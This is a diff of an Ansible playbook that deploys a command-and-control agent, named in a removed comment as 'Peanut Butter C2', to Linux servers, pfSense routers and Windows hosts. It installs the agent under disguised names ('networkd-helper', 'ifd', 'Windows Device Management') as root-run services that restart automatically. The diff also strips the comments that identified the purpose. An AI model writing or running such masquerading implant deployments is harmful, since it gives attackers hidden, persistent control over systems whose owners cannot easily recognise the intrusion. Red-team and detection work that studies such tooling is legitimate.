@@ -1,22 +1,10 @@
-# deploy.yml
-# Multi-platform deployment for Peanut Butter C2
-
-# -----------------------
-# Linux hosts
-# -----------------------
 - name: Install pbagent on Linux hosts
-  hosts: linux
-  gather_facts: yes
+  hosts:
+    - linux
   become: true
   tasks:
 
-    - name: Ensure /usr/local/bin exists
-      ansible.builtin.file:
-        path: /usr/local/bin
-        state: directory
-        mode: '0755'
-
-    - name: Copy pbagent binary to Linux hosts
+    - name: Copy binary to Linux hosts
       ansible.builtin.copy:
         src: ../bin/linux_amd64/pbagent
         dest: /usr/local/bin/networkd-helper
@@ -24,23 +12,20 @@
         group: root
         mode: '0550'
 
-    - name: Install systemd service for Linux
+    - name: Install systemd service
       ansible.builtin.command: /usr/local/bin/networkd-helper install
       args:
         creates: /etc/systemd/system/networkd-helper.service
 
-    - name: Enable systemd service for Linux
+    - name: Enable and start service
       ansible.builtin.systemd:
         name: networkd-helper
-        enabled: yes
+        enabled: true
         state: restarted
-        daemon_reload: yes
 
-# -----------------------
-# pfSense / FreeBSD hosts
-# -----------------------
 - name: Install pbagent on pfSense hosts
-  hosts: routers
+  hosts:
+    - routers
   tasks:
 
     - name: Copy binary to pfSense hosts
@@ -61,24 +46,30 @@
 
     - name: Start service
       ansible.builtin.command: service ifd restart
-# -----------------------
-# Windows hosts
-# -----------------------
+
 - name: Install pbagent on Windows hosts
-  hosts: windows
+  hosts:
+    - windows
+  vars:
+    ansible_connection: winrm
+    ansible_become_method: runas
   tasks:
 
-    - name: Stop Windows service if running
+    - name: Create directory for pbagent on Windows hosts
+      ansible.windows.win_file:
+        path: 'C:\\Program Files\\Windows Device Management'
+        state: directory
+
+    - name: Stop Windows Device Management service if running
       ansible.windows.win_service:
         name: Windows Device Management
         state: stopped
-      ignore_errors: yes
+      ignore_errors: yes  # in case service doesn't exist yet
 
     - name: Copy binary to Windows hosts
       ansible.windows.win_copy:
         src: ../bin/windows_amd64/pbagent.exe
-        dest: C:\Program Files\Windows Device Management\wdm.exe
-        force: yes
+        dest: 'C:\\Program Files\\Windows Device Management\\wdm.exe'
 
     - name: Uninstall existing service if present
       ansible.windows.win_shell: >
@@ -88,8 +79,7 @@
       ignore_errors: yes
 
     - name: Install Windows service
-      ansible.windows.win_shell: >
-        Start-Process -FilePath "C:\Program Files\Windows Device Management\wdm.exe" -ArgumentList install -Wait
+      ansible.windows.win_command: '"C:\\Program Files\\Windows Device Management\\wdm.exe" install'
 
     - name: Start Windows service
       ansible.windows.win_service:
